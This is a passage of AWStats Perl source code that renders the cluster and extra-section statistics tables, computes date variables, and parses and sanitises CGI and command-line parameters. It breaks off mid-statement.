\"$AddLinkToExternalCGIWrapper\" . \"?section=CLUSTER&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \t\n\t&tab_head( \"$title\", 19, 0, 'clusters' );\n\t\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%_cluster_p, \\%_cluster_p );\n\t\n\t# Graph the top five in a pie chart\n\tif (scalar @keylist > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy @valcolor = ($color_p);\n\t\t\tmy $cnt = 0;\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\tpush @valdata, int( $_cluster_p{$key} / $TotalHits * 1000 ) / 10;\n\t\t\t\tpush @blocklabel, \"$key\";\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 4) { last; }\n\t\t\t}\n\t\t\tprint \"<tr><td colspan=\\\"7\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"$title\",              \"cluster\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t\\@valcolor,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\t\n\tprint\n\t  \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>$Message[155]</th>\";\n\t&HTMLShowClusterInfo('__title__');\n\tif ( $ShowClusterStats =~ /P/i ) {\n\t\tprint\n\"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th>\";\n\t}\n\tif ( $ShowClusterStats =~ /H/i ) {\n\t\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th>\";\n\t}\n\tif ( $ShowClusterStats =~ /B/i ) {\n\t\tprint\n\"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th><th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[15]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_p = my $total_h = my $total_k = 0;\n\n# Cluster feature might have been enable in middle of month so we recalculate\n# total for cluster section only, to calculate ratio, instead of using global total\n\tforeach my $key (@keylist) {\n\t\t$total_p += int( $_cluster_p{$key} || 0 );\n\t\t$total_h += int( $_cluster_h{$key} || 0 );\n\t\t$total_k += int( $_cluster_k{$key} || 0 );\n\t}\n\tmy $count = 0;\n\tforeach my $key (@keylist) {\n\t\tmy $p_p = int( $_cluster_p{$key} / $total_p * 1000 ) / 10;\n\t\tmy $p_h = int( $_cluster_h{$key} / $total_h * 1000 ) / 10;\n\t\tmy $p_k = int( $_cluster_k{$key} / $total_k * 1000 ) / 10;\n\t\tprint \"<tr>\";\n\t\tprint \"<td class=\\\"aws\\\">Computer $key</td>\";\n\t\t&HTMLShowClusterInfo($key);\n\t\tif ( $ShowClusterStats =~ /P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_cluster_p{$key} ? Format_Number($_cluster_p{$key}) : \"&nbsp;\" )\n\t\t\t  . \"</td><td>$p_p %</td>\";\n\t\t}\n\t\tif ( $ShowClusterStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_cluster_h{$key}).\"</td><td>$p_h %</td>\";\n\t\t}\n\t\tif ( $ShowClusterStats =~ /B/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Bytes( $_cluster_k{$key} )\n\t\t\t  . \"</td><td>$p_k %</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$count++;\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints a chart or table for each extra section\n# Parameters:   $NewLinkParams, $NewLinkTarget, $extranum\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainExtra{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\tmy $extranum = shift;\n\t\n\tif ($Debug) { debug( \"ExtraName$extranum\", 2 ); }\n\tprint \"$Center<a name=\\\"extra$extranum\\\">&nbsp;</a><br />\";\n\tmy $title = $ExtraName[$extranum];\n\t&tab_head( \"$title\", 19, 0, \"extra$extranum\" );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\">\";\n\tprint \"<th>\" . $ExtraFirstColumnTitle[$extranum];\n\tprint \"&nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t? XMLEncode(\n\t\t\t\"$AWScript${NewLinkParams}output=allextra$extranum\")\n\t\t: \"$StaticLinks.allextra$extranum.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\";\n\t  \n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n        print \"&nbsp; - &nbsp; <a href=\\\"\"\n          . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=EXTRA_$extranum&baseName=$DirData/$PROG\"\n            . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n            . \"&sectionTitle=$ExtraName[$extranum]&siteConfig=$SiteConfig\" )\n            . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n  \n\tprint \"</th>\";\n\n\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th>\";\n\t}\n\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_p = my $total_h = my $total_k = 0;\n\n\t #$max_h=1; foreach (values %_login_h) { if ($_ > $max_h) { $max_h = $_; } }\n\t #$max_k=1; foreach (values %_login_k) { if ($_ > $max_k) { $max_k = $_; } }\n\tmy $count = 0;\n\tif ( $MaxNbOfExtra[$extranum] ) {\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\t&BuildKeyList(\n\t\t\t\t$MaxNbOfExtra[$extranum],\n\t\t\t\t$MinHitExtra[$extranum],\n\t\t\t\t\\%{ '_section_' . $extranum . '_h' },\n\t\t\t\t\\%{ '_section_' . $extranum . '_p' }\n\t\t\t);\n\t\t}\n\t\telse {\n\t\t\t&BuildKeyList(\n\t\t\t\t$MaxNbOfExtra[$extranum],\n\t\t\t\t$MinHitExtra[$extranum],\n\t\t\t\t\\%{ '_section_' . $extranum . '_h' },\n\t\t\t\t\\%{ '_section_' . $extranum . '_h' }\n\t\t\t);\n\t\t}\n\t}\n\telse {\n\t\t@keylist = ();\n\t}\n\tmy %keysinkeylist = ();\n\tforeach my $key (@keylist) {\n\t\t$keysinkeylist{$key} = 1;\n\t\tmy $firstcol = CleanXSS( DecodeEncodedString($key) );\n\t\t$total_p += ${ '_section_' . $extranum . '_p' }{$key};\n\t\t$total_h += ${ '_section_' . $extranum . '_h' }{$key};\n\t\t$total_k += ${ '_section_' . $extranum . '_k' }{$key};\n\t\tprint \"<tr>\";\n\t\tprintf(\n\t\t\t\"<td class=\\\"aws\\\">$ExtraFirstColumnFormat[$extranum]</td>\",\n\t\t\t$firstcol, $firstcol, $firstcol, $firstcol, $firstcol );\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ${ '_section_' . $extranum . '_p' }{$key} . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ${ '_section_' . $extranum . '_h' }{$key} . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Bytes(\n\t\t\t\t${ '_section_' . $extranum . '_k' }{$key} )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t${ '_section_' . $extranum . '_l' }{$key}\n\t\t\t\t? Format_Date(\n\t\t\t\t\t${ '_section_' . $extranum . '_l' }{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$count++;\n\t}\n\n\t# If we ask average or sum, we loop on all other records\n\tif ( $ExtraAddAverageRow[$extranum] || $ExtraAddSumRow[$extranum] )\n\t{\n\t\tforeach ( keys %{ '_section_' . $extranum . '_h' } ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\t$total_p += ${ '_section_' . $extranum . '_p' }{$_};\n\t\t\t$total_h += ${ '_section_' . $extranum . '_h' }{$_};\n\t\t\t$total_k += ${ '_section_' . $extranum . '_k' }{$_};\n\t\t\t$count++;\n\t\t}\n\t}\n\n\t# Add average row\n\tif ( $ExtraAddAverageRow[$extranum] ) {\n\t\tprint \"<tr>\";\n\t\tprint \"<td class=\\\"aws\\\"><b>$Message[96]</b></td>\";\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $count ? Format_Number(( $total_p / $count )) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $count ? Format_Number(( $total_h / $count )) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$count ? Format_Bytes( $total_k / $count ) : \"&nbsp;\" )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\t\tprint \"<td>&nbsp;</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\n\t# Add sum row\n\tif ( $ExtraAddSumRow[$extranum] ) {\n\t\tprint \"<tr>\";\n\t\tprint \"<td class=\\\"aws\\\"><b>$Message[102]</b></td>\";\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/P/i ) {\n\t\t\tprint \"<td>\" . Format_Number(($total_p)) . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/H/i ) {\n\t\t\tprint \"<td>\" . Format_Number(($total_h)) . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($total_k) . \"</td>\";\n\t\t}\n\t\tif ( $ExtraStatTypes[$extranum] =~ m/L/i ) {\n\t\t\tprint \"<td>&nbsp;</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# MAIN\n#------------------------------------------------------------------------------\n( $DIR  = $0 ) =~ s/([^\\/\\\\]+)$//;\n( $PROG = $1 ) =~ s/\\.([^\\.]*)$//;\n$Extension = $1;\n$DIR ||= '.';\n$DIR =~ s/([^\\/\\\\])[\\\\\\/]+$/$1/;\n\n$starttime = time();\n\n# Get current time (time when AWStats was started)\n( $nowsec, $nowmin, $nowhour, $nowday, $nowmonth, $nowyear, $nowwday, $nowyday )\n  = localtime($starttime);\n$nowweekofmonth = int( $nowday / 7 );\n$nowweekofyear  =\n  int( ( $nowyday - 1 + 6 - ( $nowwday == 0 ? 6 : $nowwday - 1 ) ) / 7 ) + 1;\nif ( $nowweekofyear > 52 ) { $nowweekofyear = 1; }\n$nowdaymod = $nowday % 7;\n$nowwday++;\n$nowns = Time::Local::timegm( 0, 0, 0, $nowday, $nowmonth, $nowyear );\n\nif ( $nowdaymod <= $nowwday ) {\n\tif ( ( $nowwday != 7 ) || ( $nowdaymod != 0 ) ) {\n\t\t$nowweekofmonth = $nowweekofmonth + 1;\n\t}\n}\nif ( $nowdaymod > $nowwday ) { $nowweekofmonth = $nowweekofmonth + 2; }\n\n# Change format of time variables\n$nowweekofmonth = \"0$nowweekofmonth\";\nif ( $nowweekofyear < 10 ) { $nowweekofyear = \"0$nowweekofyear\"; }\nif ( $nowyear < 100 ) { $nowyear += 2000; }\nelse { $nowyear += 1900; }\n$nowsmallyear = $nowyear;\n$nowsmallyear =~ s/^..//;\nif ( ++$nowmonth < 10 ) { $nowmonth = \"0$nowmonth\"; }\nif ( $nowday < 10 )     { $nowday   = \"0$nowday\"; }\nif ( $nowhour < 10 )    { $nowhour  = \"0$nowhour\"; }\nif ( $nowmin < 10 )     { $nowmin   = \"0$nowmin\"; }\nif ( $nowsec < 10 )     { $nowsec   = \"0$nowsec\"; }\n$nowtime = int( $nowyear . $nowmonth . $nowday . $nowhour . $nowmin . $nowsec );\n\n# Get tomorrow time (will be used to discard some record with corrupted date (future date))\nmy (\n\t$tomorrowsec, $tomorrowmin,   $tomorrowhour,\n\t$tomorrowday, $tomorrowmonth, $tomorrowyear\n  )\n  = localtime( $starttime + 86400 );\nif ( $tomorrowyear < 100 ) { $tomorrowyear += 2000; }\nelse { $tomorrowyear += 1900; }\nif ( ++$tomorrowmonth < 10 ) { $tomorrowmonth = \"0$tomorrowmonth\"; }\nif ( $tomorrowday < 10 )     { $tomorrowday   = \"0$tomorrowday\"; }\nif ( $tomorrowhour < 10 )    { $tomorrowhour  = \"0$tomorrowhour\"; }\nif ( $tomorrowmin < 10 )     { $tomorrowmin   = \"0$tomorrowmin\"; }\nif ( $tomorrowsec < 10 )     { $tomorrowsec   = \"0$tomorrowsec\"; }\n$tomorrowtime =\n  int(  $tomorrowyear\n\t  . $tomorrowmonth\n\t  . $tomorrowday\n\t  . $tomorrowhour\n\t  . $tomorrowmin\n\t  . $tomorrowsec );\n\n# Allowed option\nmy @AllowedCLIArgs = (\n\t'migrate',            'config',\n\t'logfile',            'output',\n\t'runascli',           'update',\n\t'staticlinks',        'staticlinksext',\n\t'noloadplugin',       'loadplugin',\n\t'hostfilter',         'urlfilter',\n\t'refererpagesfilter', 'lang',\n\t'month',              'year',\n\t'framename',          'debug',\n\t'showsteps',          'showdropped',\n\t'showcorrupted',      'showunknownorigin',\n\t'showdirectorigin',   'limitflush',\n    'nboflastupdatelookuptosave',\n\t'confdir',            'updatefor',\n\t'hostfilter',         'hostfilterex',\n\t'urlfilter',          'urlfilterex',\n\t'refererpagesfilter', 'refererpagesfilterex',\n\t'pluginmode',         'filterrawlog'\n);\n\n# Parse input parameters and sanitize them for security reasons\n$QueryString = '';\n\n# AWStats use GATEWAY_INTERFACE to known if ran as CLI or CGI. AWSTATS_DEL_GATEWAY_INTERFACE can\n# be set to force AWStats to be ran as CLI even from a web page.\nif ( $ENV{'AWSTATS_DEL_GATEWAY_INTERFACE'} ) { $ENV{'GATEWAY_INTERFACE'} = ''; }\nif ( $ENV{'GATEWAY_INTERFACE'} ) {    # Run from a browser as CGI\n\t$DebugMessages = 0;\n\n\t# Prepare QueryString\n\tif ( $ENV{'CONTENT_LENGTH'} ) {\n\t\tbinmode STDIN;\n\t\tread( STDIN, $QueryString, $ENV{'CONTENT_LENGTH'} );\n\t}\n\tif ( $ENV{'QUERY_STRING'} ) {\n\t\t$QueryString = $ENV{'QUERY_STRING'};\n\n\t\t# Set & and &amp; to &amp;\n\t\t$QueryString =~ s/&amp;/&/g;\n\t\t$QueryString =~ s/&/&amp;/g;\n\t}\n\n\t# Remove all XSS vulnerabilities coming from AWStats parameters\n\t$QueryString = CleanXSS( &DecodeEncodedString($QueryString) );\n\n\t# Security test\n\tif ( $QueryString =~ /LogFile=([^&]+)/i ) {\n\t\terror(\n\"Logfile parameter can't be overwritten when AWStats is used from a CGI\"\n\t\t);\n\t}\n\n\t# No update but report by default when run from a browser\n\t$UpdateStats = ( $QueryString =~ /update=1/i ? 1 : 0 );\n\n\tif ( $QueryString =~ /config=([^&]+)/i ) { \n\t\t$SiteConfig = &Sanitize(\"$1\");\n\t\t$SiteConfig =~ s/\\.\\.//g; \t\t# Avoid directory transversal\n\t}\n\tif ( $QueryString =~ /diricons=([^&]+)/i ) { $DirIcons = \"$1\"; }\n\tif ( $QueryString =~ /pluginmode=([^&]+)/i ) {\n\t\t$PluginMode = &Sanitize( \"$1\", 1 );\n\t}\n\tif ( $QueryString =~ /configdir=([^&]+)/i ) {\n\t\t$DirConfig = &Sanitize(\"$1\");\n\t\t$DirConfig =~ s/\\\\{2,}/\\\\/g;\t# This is to clean Remote URL\n\t\t$DirConfig =~ s/\\/{2,}/\\//g;\t# This is to clean Remote URL\n\t}\n\n\t# All filters\n\tif ( $QueryString =~ /hostfilter=([^&]+)/i ) {\n\t\t$FilterIn{'host'} = \"$1\";\n\t}    # Filter on host list can also be defined with hostfilter=filter\n\tif ( $QueryString =~ /hostfilterex=([^&]+)/i ) {\n\t\t$FilterEx{'host'} = \"$1\";\n\t}    #\n\tif ( $QueryString =~ /urlfilter=([^&]+)/i ) {\n\t\t$FilterIn{'url'} = \"$1\";\n\t}    # Filter on URL list can also be defined with urlfilter=filter\n\tif ( $QueryString =~ /urlfilterex=([^&]+)/i ) { $FilterEx{'url'} = \"$1\"; } #\n\tif ( $QueryString =~ /refererpagesfilter=([^&]+)/i ) {\n\t\t$FilterIn{'refererpages'} = \"$1\";\n\t} # Filter on referer list can also be defined with refererpagesfilter=filter\n\tif ( $QueryString =~ /refererpagesfilterex=([^&]+)/i ) {\n\t\t$FilterEx{'refererpages'} = \"$1\";\n\t}    #\n\t     # All output\n\tif ( $QueryString =~ /output=allhosts:([^&]+)/i ) {\n\t\t$FilterIn{'host'} = \"$1\";\n\t} # Filter on host list can be defined with output=allhosts:filter to reduce number of lines read and showed\n\tif ( $QueryString =~ /output=lasthosts:([^&]+)/i ) {\n\t\t$FilterIn{'host'} = \"$1\";\n\t} # Filter on host list can be defined with output=lasthosts:filter to reduce number of lines read and showed\n\tif ( $QueryString =~ /output=urldetail:([^&]+)/i ) {\n\t\t$FilterIn{'url'} = \"$1\";\n\t} # Filter on URL list can be defined with output=urldetail:filter to reduce number of lines read and showed\n\tif ( $QueryString =~ /output=refererpages:([^&]+)/i ) {\n\t\t$FilterIn{'refererpages'} = \"$1\";\n\t} # Filter on referer list can be defined with output=refererpages:filter to reduce number of lines read and showed\n\n\t# If migrate\n\tif ( $QueryString =~ /(^|-|&|&amp;)migrate=([^&]+)/i ) {\n\t\t$MigrateStats = &Sanitize(\"$2\");\n\t\t$MigrateStats =~ /^(.*)$PROG(\\d{0,2})(\\d\\d)(\\d\\d\\d\\d)(.*)\\.txt$/;\n\t\t$SiteConfig = $5 ? $5 : 'xxx';\n\t\t$SiteConfig =~ s/^\\.//;    # SiteConfig is used to find config file\n\t}\n}\nelse {                             # Run from command line\n\t$DebugMessages = 1;\n\n\t# Prepare QueryString\n\tfor ( 0 .. @ARGV - 1 ) {\n\n\t\t# If migrate\n\t\tif ( $ARGV[$_] =~ /(^|-|&|&amp;)migrate=([^&]+)/i ) {\n\t\t\t$MigrateStats = \"$2\";\n\t\t\t$MigrateStats =~ /^(.*)$PROG(\\d{0,2})(\\d\\d)(\\d\\d\\d\\d)(.*)\\.txt$/;\n\t\t\t$SiteConfig = $5 ? $5 : 'xxx';\n\t\t\t$SiteConfig =~ s/^\\.//;    # SiteConfig is used to find config file\n\t\t\tnext;\n\t\t}\n\n\t\t# TODO Check if ARGV is in @AllowedArg\n\t\tif ($QueryString) { $QueryString .= '&amp;'; }\n\t\tmy $NewLinkParams = $ARGV[$_];\n\t\t$NewLinkParams =~ s/^-+//;\n\t\t$QueryString .= \"$NewLinkParams\";\n\t}\n\n\t# Remove all XSS vulnerabilities coming from AWStats parameters\n\t$QueryString = CleanXSS($QueryString);\n\n\t# Security test\n\tif (   $ENV{'AWSTATS_DEL_GATEWAY_INTERFACE'}\n\t\t&& $QueryString =~ /LogFile=([^&]+)/i )\n\t{\n\t\terror(\n\"Logfile parameter can't be overwritten when AWStats is used from a CGI\"\n\t\t);\n\t}\n\n\t# Update with no report by default when run from command line\n\t$UpdateStats = 1;\n\n\tif ( $QueryString =~ /config=([^&]+)/i ) { \n\t\t$SiteConfig = &Sanitize(\"$1\"); \n\t\t$SiteConfig =~ s/\\.\\.//g; \n\t}\n\tif ( $QueryString =~ /diricons=([^&]+)/i ) { $DirIcons = \"$1\"; }\n\tif ( $QueryString =~ /pluginmode=([^&]+)/i ) {\n\t\t$PluginMode = &Sanitize( \"$1\", 1 );\n\t}\n\tif ( $QueryString =~ /configdir=([^&]+)/i ) {\n\t\t$DirConfig = &Sanitize(\"$1\");\n\t\t$DirConfig =~ s/\\\\{2,}/\\\\/g;\t# This is to clean Remote URL\n\t\t$DirConfig =~ s/\\/{2,}/\\//g;\t# This is to clean Remote URL\n\t}\n\n\t# All filters\n\tif ( $QueryString =~ /hostfilter=([^&]+)/i ) {\n\t\t$FilterIn{'host'} = \"$1\";\n\t}    # Filter on host list can also be defined with hostfilter=filter\n\tif ( $QueryString =~ /hostfilterex=([^&]+)/i ) {\n\t\t$FilterEx{'host'} = \"$1\";\n\t}    #\n\tif ( $QueryString =~ /urlfilter=([^&]+)/i ) {\n\t\t$FilterIn{'url'} = \"$1\";\n\t}    # Filter on URL list can also be defined with urlfilter=filter\n\tif ( $QueryString =~ /urlfilterex=([^&]+)/i ) { $FilterEx{'url'} = \"$1\"; } #\n\tif ( $QueryString =~ /refererpagesfilter=([^&]+)/i ) {\n\t\t$FilterIn{'refererpages'} = \"$1\";\n\t} # Filter on referer list can also be defined with refererpagesfilter=filter\n\tif ( $QueryString =~ /refererpagesfilterex=([^&]+)/i ) {\n\t\t$FilterEx{'refererpages'} = \"$1\";\n\t}    #\n\t     # All output\n\tif ( $QueryString =~ /output=allhosts:([^&]+)/i ) {\n\t\t$FilterIn{'host'} = \"$1\";\n\t} # Filter on host list can be defined with output=allhosts:filter to reduce number of lines read and showed\n\tif ( $QueryString =~ /output=lasthosts:([^&]+)/i ) {\n\t\t$FilterIn{'host'} = \"$1\";\n\t} # Filter on host list can be defined with output=lasthosts:filter to reduce number of lines read and showed\n\tif ( $QueryString =~ /output=urldetail:([^&]+)/i ) {\n\t\t$FilterIn{'url'} = \"$1\";\n\t} # Filter on URL list can be defined with output=urldetail:filter to reduce number of lines read and showed\n\tif ( $QueryString =~ /output=refererpages:([^&]+)/i ) {\n\t\t$FilterIn{'refererpages'} = \"$1\";\n\t} # Filter on referer list can be defined with output=refererpages:filter to reduce number of lines read and showed\n\t  # Config parameters\n\tif ( $QueryString =~ /LogFile=([^&]+)/i ) { $LogFile = \"$1\"; }\n\n\t# If show options\n\tif ( $QueryString =~ /showsteps/i ) {\n\t\t$ShowSteps = 1;\n\t\t$QueryString =~ s/showsteps[^&]*//i;\n\t}\n\tif ( $QueryString =~ /showcorrupted/i ) {\n\t\t$ShowCorrupted = 1;\n\t\t$QueryString =~ s/showcorrupted[^&]*//i;\n\t}\n\tif ( $QueryString =~ /showdropped/i ) {\n\t\t$ShowDropped = 1;\n\t\t$QueryString =~ s/showdropped[^&]*//i;\n\t}\n\tif ( $QueryString =~ /showunknownorigin/i ) {\n\t\t$ShowUnknownOrigin = 1;\n\t\t$QueryString =~ s/showunknownorigin[^&]*//i;\n\t}\n\tif ( $QueryString =~ /showdirectorigin/i ) {\n\t\t$ShowDirectOrigin = 1;\n\t\t$QueryString =~ s/showdirectorigin[^&]*//i;\n\t}\n}\nif ( $QueryString =~ /(^|&|&amp;)staticlinks/i ) {\n\t$StaticLinks = \"$PROG.$SiteConfig\";\n}\nif ( $QueryString =~ /(^|&|&amp;)staticlinks=([^&]+)/i ) {\n\t$StaticLinks = \"$2\";\n}    # When ran from awstatsbuildstaticpages.pl\nif ( $QueryString =~ /(^|&|&amp;)staticlinksext=([^&]+)/i ) {\n\t$StaticExt = \"$2\";\n}\nif ( $QueryString =~ /(^|&|&amp;)framename=([^&]+)/i ) { $FrameName = \"$2\"; }\nif ( $QueryString =~ /(^|&|&amp;)debug=(\\d+)/i )       { $Debug     = $2; }\nif ( $QueryString =~ /(^|&|&amp;)databasebreak=(\\w+)/i ) {\n\t$DatabaseBreak = $2;\n}\nif ( $QueryString =~ /(^|&|&amp;)updatefor=(\\d+)/i ) { $UpdateFor = $2; }\n\nif ( $QueryString =~ /(^|&|&amp;)noloadplugin=([^&]+)/i ) {\n\tforeach ( split( /,/, $2 ) ) { $NoLoadPlugin{ &Sanitize( \"$_\", 1 ) } = 1; }\n}\nif ( $QueryString =~ /(^|&|&amp;)limitflush=(\\d+)/i ) { $LIMITFLUSH = $2; }\nif ( $QueryString =~ /(^|&|&amp;)nboflastupdatelookuptosave=(\\d+)/i ) { $NBOFLASTUPDATELOOKUPTOSAVE = $2; }\n\n# Get/Define output\nif ( $QueryString =~\n\t/(^|&|&amp;)output(=[^&]*|)(.*)(&|&amp;)output(=[^&]*|)(&|$)/i )\n{\n\terror( \"Only 1 output option is allowed\", \"\", \"\", 1 );\n}\nif ( $QueryString =~ /(^|&|&amp;)output(=[^&]*|)(&|$)/i ) {\n\n\t# At least one output expected. We define %HTMLOutput\n\tmy $outputlist = \"$2\";\n\tif ($outputlist) {\n\t\t$outputlist =~ s/^=//;\n\t\tforeach my $outputparam ( split( /,/, $outputlist ) ) {\n\t\t\t$outputparam =~ s/:(.*)$//;\n\t\t\tif ($outputparam) { $HTMLOutput{ lc($outputparam) } = \"$1\" || 1; }\n\t\t}\n\t}\n\n\t# If on command line and no update\n\tif ( !$ENV{'GATEWAY_INTERFACE'} && $QueryString !~ /update/i ) {\n\t\t$UpdateStats = 0;\n\t}\n\n\t# If no output defined, used default value\n\tif ( !scalar keys %HTMLOutput ) { $HTMLOutput{'main'} = 1; }\n}\nif ( $ENV{'GATEWAY_INTERFACE'} && !scalar keys %HTMLOutput ) {\n\t$HTMLOutput{'main'} = 1;\n}\n\n# Remove -output option with no = from QueryString\n$QueryString =~ s/(^|&|&amp;)output(&|$)/$1$2/i;\n$QueryString =~ s/&+$//;\n\n# Check year, month, day, hour parameters\nif ( $QueryString =~ /(^|&|&amp;)month=(year)/i ) {\n\terror(\"month=year is a deprecated option. Use month=all instead.\");\n}\nif ( $QueryString =~ /(^|&|&amp;)year=(\\d\\d\\d\\d)/i ) {\n\t$YearRequired = sprintf( \"%04d\", $2 );\n}\nelse { $YearRequired = \"$nowyear\"; }\nif ( $QueryString =~ /(^|&|&amp;)month=(\\d{1,2})/i ) {\n\t$MonthRequired = sprintf( \"%02d\", $2 );\n}\nelsif ( $QueryString =~ /(^|&|&amp;)month=(all)/i ) { $MonthRequired = 'all'; }\nelse { $MonthRequired = \"$nowmonth\"; }\nif ( $QueryString =~ /(^|&|&amp;)day=(\\d{1,2})/i ) {\n\t$DayRequired = sprintf( \"%02d\", $2 );\n} # day is a hidden option. Must not be used (Make results not understandable). Available for users that rename history files with day.\nelse { $DayRequired = ''; }\nif ( $QueryString =~ /(^|&|&amp;)hour=(\\d{1,2})/i ) {\n\t$HourRequired = sprintf( \"%02d\", $2 );\n} # hour is a hidden option. Must not be used (Make results not understandable). Available for users that rename history files with day.\nelse { $HourRequired = ''; }\n\n# Check parameter validity\n# TODO\n\n# Print AWStats and Perl version\nif ($Debug) {\n\tdebug( ucfirst($PROG) . \" - $VERSION - Perl $^X $]\", 1 );\n\tdebug( \"DIR=$DIR PROG=$PROG Extension=$Extension\",   2 );\n\tdebug( \"QUERY_STRING=$QueryString\",                  2 );\n\tdebug( \"HTMLOutput=\" . join( ',', keys %HTMLOutput ), 1 );\n\tdebug( \"YearRequired=$YearRequired, MonthRequired=$MonthRequired\", 2 );\n\tdebug( \"DayRequired=$DayRequired, HourRequired=$HourRequired\",     2 );\n\tdebug( \"UpdateFor=$UpdateFor\",                                     2 );\n\tdebug( \"PluginMode=$PluginMode\",                                   2 );\n\tdebug( \"DirConfig=$DirConfig\",                                     2 );\n}\n\n# Force SiteConfig if AWSTATS_FORCE_CONFIG is defined\nif ( $ENV{'AWSTATS_CONFIG'} ) {\n\t$ENV{'AWSTATS_FORCE_CONFIG'} = $ENV{'AWSTATS_CONFIG'};\n}    # For backward compatibility\nif ( $ENV{'AWSTATS_FORCE_CONFIG'} ) {\n\tif ($Debug) {\n\t\tdebug(  \"AWSTATS_FORCE_CONFIG parameter is defined to '\"\n\t\t\t  . $ENV{'AWSTATS_FORCE_CONFIG'}\n\t\t\t  . \"'. $PROG will use this as config value.\" );\n\t}\n\t$SiteConfig = &Sanitize( $ENV{'AWSTATS_FORCE_CONFIG'} );\n}\n\n# Display version information\nif ( $QueryString =~ /(^|&|&amp;)version/i ) {\n\tprint \"$PROG $VERSION\\n\";\n\texit 0;\n}\n# Display help information\nif ( ( !$ENV{'GATEWAY_INTERFACE'} ) && ( 